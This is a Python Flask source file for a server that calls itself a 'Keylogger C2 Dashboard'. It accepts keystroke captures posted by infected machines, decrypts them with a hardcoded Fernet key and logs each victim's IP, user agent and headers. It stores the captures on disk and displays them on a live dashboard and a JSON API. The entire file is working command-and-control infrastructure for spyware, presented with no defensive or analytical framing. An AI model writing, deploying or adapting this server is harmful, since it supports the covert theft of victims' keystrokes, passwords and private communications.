from flask import Flask, request, jsonify, render_template_string, send_from_directory
from cryptography.fernet import Fernet
import os
import json
import base64
import time
from datetime import datetime
import threading
from collections import deque

app = Flask(__name__)
DATA_DIR = '/app/data'
os.makedirs(DATA_DIR, exist_ok=True)

# In-Memory Live Data (fast dashboard)
live_captures = deque(maxlen=1000)  # Last 1000 captures
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', b'pXv3zK9mN2qL7rT5uY1wE8oA4sD6fG0hJ3kM9nB2vC5xZ8=')

fernet = Fernet(ENCRYPTION_KEY)

HTML_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>Keylogger C2 Dashboard</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .capture { background: #333; margin: 10px 0; padding: 15px; border-left: 4px solid #00ff00; }
        .timestamp { color: #888; font-size: 12px; }
        .data { white-space: pre-wrap; font-size: 14px; }
        .files { background: #222; padding: 10px; margin-top: 20px; }
        button { background: #00ff00; color: black; border: none; padding: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>🔥 Live Keylogger C2 Dashboard ({{ captures|length }} captures)</h1>
    <div class="files">
        <h3>📁 Stored Files ({{ files|length }})</h3>
        {% for file in files %}
            <a href="/files/{{ file }}" target="_blank">{{ file }}</a><br>
        {% endfor %}
    </div>
    {% for capture in captures %}
    <div class="capture">
        <div class="timestamp">{{ capture.timestamp }}</div>
        <div class="data">{{ capture.data }}</div>
    </div>
    {% endfor %}
</body>
</html>
"""

@app.route('/log', methods=['POST'])
def log_capture():
    try:
        # Accept any payload type
        if request.is_json:
            raw_data = request.json
        elif request.form:
            raw_data = dict(request.form)
        else:
            raw_data = {'raw': request.data.decode('utf-8', errors='ignore')}
        
        # Decrypt if encrypted
        if 'encrypted' in raw_data:
            try:
                decrypted = fernet.decrypt(base64.b64decode(raw_data['encrypted']))
                raw_data = json.loads(decrypted.decode())
            except:
                pass  # Keep encrypted as-is
        
        # Add metadata
        capture = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'unknown'),
            'data': json.dumps(raw_data, indent=2),
            'headers': dict(request.headers)
        }
        
        # Live memory + disk storage
        live_captures.append(capture)
        
        filename = f"{DATA_DIR}/capture_{int(time.time()*1000)}.json"
        with open(filename, 'w') as f:
            json.dump(capture, f, indent=2)
        
        print(f"📥 Capture from {capture['ip']}: {len(raw_data)} keys")
        return jsonify({'status': 'OK', 'id': filename}), 200
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def dashboard():
    files = [f for f in os.listdir(DATA_DIR) if f.endswith('.json')]
    return render_template_string(HTML_DASHBOARD, captures=list(live_captures)[-50:], files=files)

@app.route('/files/<filename>')
def serve_file(filename):
    return send_from_directory(DATA_DIR, filename)

@app.route('/api/captures')
def api_captures():
    return jsonify(list(live_captures)[-100:])

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)